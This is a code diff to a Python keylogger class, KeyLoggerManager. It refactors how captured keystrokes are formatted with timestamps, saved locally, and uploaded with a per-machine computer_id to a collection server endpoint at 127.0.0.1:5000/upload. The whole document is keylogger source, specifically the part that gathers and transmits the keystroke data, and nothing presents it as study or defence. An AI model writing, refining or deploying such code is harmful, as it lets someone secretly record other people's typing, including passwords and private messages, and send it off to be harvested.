@@ -49,32 +49,44 @@ class KeyLoggerManager:
         print(f"Added {len(logged_keys)} keys to the dictionary.")
 
     def save_locally(self):
+        """Save logs locally and send them to the server."""
         try:
-            print(f"Data to send: {self.data_dic}")
+            formatted_entries = self.format_logs()
+            if not formatted_entries:
+                print("No new data to save.")
+                return
 
-            # Create a list to store entries
-            entries = []
-            for timestamp, data in self.data_dic.items():
-                entries.append({timestamp: data})  # Add each entry to the list
+            print(f"Data to send: {formatted_entries}")
 
             # Send data to the server
-            self.send_to_server()  # Keep sending to the server
-            self.file_writer.send_data(entries, self.computer_id)  # Write the list to a file
+            self.send_to_server(formatted_entries)
+
+            # Save data locally
+            self.file_writer.send_data(formatted_entries, self.computer_id)
             print("Data saved locally.")
-            self.data_dic = {}
+
+            self.data_dic = {}  # Clear the dictionary after saving
         except Exception as e:
             print(f"Failed to save data locally: {e}")
 
-    def send_to_server(self):
-        """Send encrypted logs to the server with the correct timestamp."""
+    def send_to_server(self, formatted_entries):
+        """Send encrypted logs to the server."""
+        if not formatted_entries:
+            print("No new data to send to the server.")
+            return
+
         payload = {
             "computer_id": self.computer_id,
-            "logs": [
-                {"timestamp": timestamp, "key_data": data["key_data"]}
-                for timestamp, data in self.data_dic.items()
-            ]  # Sending the correct timestamp directly!
+            "logs": formatted_entries  # Directly send the formatted data
         }
         self.network_writer.send_data(payload, "http://127.0.0.1:5000/upload")
+
+    def format_logs(self):
+        """Format logs consistently for both local storage and server transmission."""
+        return [
+            {"timestamp": timestamp, "key_data": data["key_data"]}
+            for timestamp, data in self.data_dic.items()
+        ]
 
 
 if __name__ == "__main__":
